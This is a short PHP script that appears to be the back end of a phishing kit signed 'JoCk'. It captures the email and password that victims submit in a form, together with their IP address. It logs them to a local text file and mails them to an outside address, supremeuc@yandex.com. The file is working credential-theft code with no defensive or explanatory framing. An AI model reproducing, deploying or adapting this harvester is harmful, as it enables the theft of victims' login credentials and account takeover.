<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------| Log By JoCk |--------------|\n";
$message .= "|username     : ".$_POST['email']."\n";
$message .= "|password : ".$_POST['password']."\n";
$message .= "|----------| I N F O S |--------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|----------| YOUR WELCOME By JoCk|--------------|\n";
$send = "supremeuc@yandex.com";
$subject = "Log By JoCk- From:  [ $ip ]";
$file = fopen("./cool.txt","a"); 
fwrite($file,$message); 
{
mail("$send", "$subject", $message);
}
$praga=rand();
$praga=md5($praga);
	
		

	 
 ?>





